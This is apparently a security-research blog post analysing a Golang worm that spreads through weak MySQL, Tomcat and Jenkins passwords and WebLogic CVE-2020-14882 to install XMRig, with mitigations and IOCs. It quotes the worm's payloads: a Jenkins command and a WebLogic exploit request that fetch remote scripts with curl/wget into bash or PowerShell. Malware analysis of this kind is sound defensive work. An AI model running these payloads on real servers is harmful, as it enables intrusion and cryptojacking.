# Early Bird Catches the Worm: New Golang Worm Drops XMRig Miner on Servers

> An undetected Golang worm spreads to Windows and Linux servers via weak MySQL, Tomcat and Jenkins passwords and WebLogic CVE-2020-14882 to run XMRig.

- Source: https://research.intezer.com/blog/2020/12/new-golang-worm-drops-xmrig-miner-on-servers/
- Published: 2020-12-29
- Authors: Avigayil Mechtinger
- Tags: cryptomining, linux
- Attribution: Intezer's Research Team (Intezer Research, https://research.intezer.com/)


In early December, we discovered a new, undetected worm written in Golang. This
worm continues the popular
[2020 trend](https://intezer.com/blog/cloud-security/top-linux-cloud-threats-of-2020/)
of multi-platform malware developed in Golang.

The worm attempts to spread across the network in order to run XMRig Miner on a
large scale. The malware targets both Windows and Linux servers and can easily
maneuver from one platform to the other. It targets public facing services;
MySQL, Tomcat admin panel and Jenkins that have weak passwords. In an older
version, the worm has also attempted to exploit WebLogic’s latest
vulnerability: CVE-2020-14882.

During our analysis, the attacker kept updating the worm on the Command and
Control (C&C) server, indicating that it’s active and might be targeting
additional weak configured services in future updates.

## Technical Analysis of New Golang Worm

The attack uses three files: a dropper script (bash or powershell), a Golang
binary worm, and an XMRig Miner—all of which are hosted on the same C&C.

The ELF worm binary and the bash dropper script are both fully undetected in
VirusTotal at the time of this publication. Figure 1 shows the ELF worm binary
result in VirusTotal.

![](images/fig1.png "Figure 1: ELF file fully undetected in VirusTotal (ead2cf8ab7aef63706b40eb57d668d0a)")

The malware behaves similarly on both Linux and Windows operating systems. We
will describe the Linux worm flow below.

### Linux Worm Attack Flow

Upon execution, the worm checks if a process on the infected machine is
listening on port 52013. The existence of a listener on this port functions as
a mutex for the malware. If a socket for the port is already open, the instance
exits, otherwise it opens a network socket on the port.

In the older version, the worm will then unpack the XMRig Miner as Network01 to
the tmp folder and run it. The miner is embedded within the Golang binary using
a
[Go resource embedding package](https://go.libhunt.com/categories/538-resource-embedding)
called [go-bindata](https://github.com/go-bindata/go-bindata). The bindataFile
functions are used by the malware to unpack the embedded XMRig Miner binary.
Figure 2 shows the function inside this file.

![](images/fig2.png "Figure 2: xmrig_linux_amd64.go file")

The malware will scan the network using TCP SYN in order to find services it
can brute force and spread over the network. It will scan for IPs that have
open ports related to these services: 8080 for Tomcat and Jenkins, 3306 for
MySQL and 7001 for WebLogic on older versions of the worm. Each of these
exploits has a package under the src “exp” (exploit) code.

![](images/fig3.png "Figure 3: “exp” package files and functions")

The worm uses the [gopacket](https://github.com/google/gopacket) library that
provides C bindings for Go to use libpcap to read network packets. By running
pcapc, the worm gathers network data which is used to gather ACKS and continue
to brute force the services. Figure 4 shows the worm’s output for brute force
and exploitation attempts on Tomcat and MySQL services.

![](images/fig4.png "Figure 4: Snippet from worm output")

Post exploitation, the malware will deliver a loader script: ld.sh for Linux
and ld.ps1 for Windows. The loader is responsible for dropping and running the
XMRig Miner and the Golang worm on the exploited service. See loader scripts in
Figures 5 and 6.

![](images/fig5.png "Figure 5:  ldr.sh – Dropper bash script for Linux-based services")

![](images/fig6.png "Figure 6: ldr.ps1 script – Dropper powershell script for Windows-based services")

### Exploit Flow

The following describes the attack flow for each service.

#### MySql: Port 3306

The malware will run a credential spraying brute force attack. The malware uses
a hardcoded dictionary of weak credentials, such as `root:123456`, for this
attack.

After a successful login, it will run a shellcode to gain a local privilege
escalation using mysql UDF. The exploits are embedded within the binary as a
hex string. The worm has an exploit for each operating system and architecture
(UDFLINUX32, UDFLINUX64, UDFLWIN32 and UDFWIN64). Browse
[here](https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss)
for more information about the exploit.

After running the exploit, the payload will use the sys_exec command to drop
and run the loader script. URLWIN and URLLINUX store the dropper script URL.
Figures 7 and 8 show the described payload for each operating system.

![](images/fig7.png "Figure 7: MySQL queries – Linux payload")

![](images/fig8.png "Figure 8: MySQL queries – Windows payload")

#### Tomcat: Port 8080

The malware will run credential spraying on the admin panel using basic
authentication.

![](images/fig9.png "Figure 9: Example of an authentication request to the Tomcat admin panel")

Upon a successful trial, the malware will attempt to deploy a WAR file (Web
Application Resource), which will be used to transfer the 1.jsp file containing
the malicious payload.

The malware will send Get requests and will parse the parameters with the jsp
file: `%s/1.jsp?win=%s&linux=%s`. These parameters will contain the dropper
script URL. The jsp script will then drop and run the loaders.

![](images/fig10.png "Figure 10: 1.jsp file script")

#### Jenkins: Port 8080

Similar to previous exploits, the malware will brute force Jenkins login with
password spraying and run the following payload:

```
cmd@/c@powershell iex(New-Object Net.WebClient).DownloadString('%s')!bash@-c@(curl -fsSL %s || wget -q -O - %s) | bash

println "%s"+"%s";def s=new String(Base64.getDecoder().decode("%s"+"%s".reverse())).split("!");def c=System.getProperty("os.name").contains("indo")?s[0].split("@"):s[1].split("@");c.execute()
```

#### WebLogic: Port 7001

In the older version, the malware uses the latest WebLogic remote code
execution exploit CVE-2020-14882. It will send a get request to the WebLogic
service, and use the GET request headers as part of the payload.

```
GET
/console/css/%%25%%32%%65%%25%%32%%65%%25%%32%%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread
%%20currentThread(weblogic.work.ExecuteThread)Thread.currentThread();weblogic.work.
WorkAdapter%%20adapter=currentThread.getCurrentWork();java.lang.reflect.Field%%20
field=adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible
(true);Object%%20obj=field.get(adapter);weblogic.servlet.internal.ServletRequestI
mpl%%20req(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod
("getServletRequest").invoke(obj);String%%20cmd=req.getHeader("cmd");String[]%%
20cmds=System.getProperty("os.name").toLowerCase().contains("win")?new%%20String[]{"cmd.exe","/c",req.getHeader("win")}:new%%20String[]{"/bin/sh","c",req.getHeader
("linux")};if(cmd!=null{String%%20result=new%%20java.util.Scanner(new%%20java.lang
.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("%%5C%%5CA").next();
weblogic.servlet.internal.ServletResponseImpl%%20res(weblogic.servlet.internal.
ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);work.
getServletOutputStream().writeStream(new%%20weblogic.xml.util.StringInputStream
(result));work.getServletOutputStream().flush
();}currentThread.interrupt();') HTTP/1.0
Host: %s:%d
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Connection: close
cmd: ls
linux: ( (curl -fsSL %s || wget -q -O - %s) | bash& )
win: start powershell iex(New-Object Net.WebClient).DownloadString('%s')
```

## How Do I Protect Myself?

Take the following precautions in order to avoid brute force attacks and
vulnerability exploits:

- Use complex passwords, limit login attempts and use 2FA (Two-Factor
  Authentication) if possible.
- Minimize your use of publicly facing services.
- Keep your software updated with the latest security patches.

## Summary of Golang Malware

In 2020, we saw a noticeable trend of Golang malware targeting different
platforms, including Windows, Linux, Mac and
[Android](https://intezer.com/blog/malware-analysis/now-supporting-genetic-malware-analysis-for-android-applications/).
We assess with high confidence that this will continue in 2021.

The fact that the worm’s code is nearly identical for both its PE and ELF
malware—and the ELF malware going undetected in VirusTotal—demonstrates that
Linux threats are still flying under the radar for most security and detection
platforms.

Both PE and ELF worms are now classified as XMRig Miner Dropper in
[Intezer Analyze](http://analyze.intezer.com/), which means you can detect and
classify any variants that are genetically similar.

![](images/fig11.png)

**Special thanks to Joakim Kennedy for his contribution to this research.**

## IOCs

### C&C

`185[.]239[.]242[.]71`

### Files

#### Linux

| Description    | File name | File type        | MD5                                           |
| -------------- | --------- | ---------------- | --------------------------------------------- |
| Dropper script | ldr.sh    | Bash script      | 236d7925cfafc1f643babdb8e48966bf              |
| Worm           | sysrv     | 64bit ELF binary | UPX packed – ead2cf8ab7aef63706b40eb57d668d0a |
| Worm           | sysrv     | 64bit ELF binary | Unpacked – 750644690e51db9f695b542b463164b9   |
| Worm           | sysrv     | 64bit ELF binary | UPX packed – f4c90b41126fc17848bd0d131288bd36 |
| Worm           | sysrv     | 64bit ELF binary | Unpacked – D8499b7b2e2aeb76387668306e982673   |
| Worm           | sysrv     | 64bit ELF binary | UPX packed – 301a0a58dd98ecbbe12c6acbd0c7bbdc |
| Worm           | sysrv     | 64bit ELF binary | Unpacked – f5859e81ff49dd66e501ec7c0f39c83e   |
| Miner          | xmr32     | 32bit ELF binary | 9c2aa65235a939b2811f281a45ecdab0              |
| Miner          | xmr64     | 64bit ELF binary | 078b2a96f45b493e82b44f8c5344e7e5              |

#### Windows

| Description    | File name | File type         | MD5                                           |
| -------------- | --------- | ----------------- | --------------------------------------------- |
| Dropper script | ldr.ps1   | PowerShell script | d708a5394e9448ab38201264df423c0a              |
| Worm           | sysrv.exe | 32bit PE binary   | UPX packed – 030231d96234f06ae09ca18d621241e5 |
| Worm           | sysrv.exe | 32bit PE binary   | Unpacked – 14f57bd246cc1db3131cab421fbc8dac   |
| Worm           | sysrv.exe | 32bit PE binary   | UPX packed – 642d73c85e6e79720a5ae7b82fc427c5 |
| Worm           | sysrv.exe | 32bit PE binary   | Unpacked – b1a4ec25e168156aeee8184b05777b1b   |
| Miner          | xmr32.exe | 32bit PE binary   | 97d89d25e9589f995d374cb7d89b4433              |
| Miner          | xmr64.exe | 64bit PE binary   | 569fcf95f3889cefd87c1b425fa37b03              |

#### JSP

| Description | File name | File type        | MD5                              |
| ----------- | --------- | ---------------- | -------------------------------- |
|             | 1.jsp     | Java Server Page | 644f20b5a6e03aa054ba62d32f983adc |
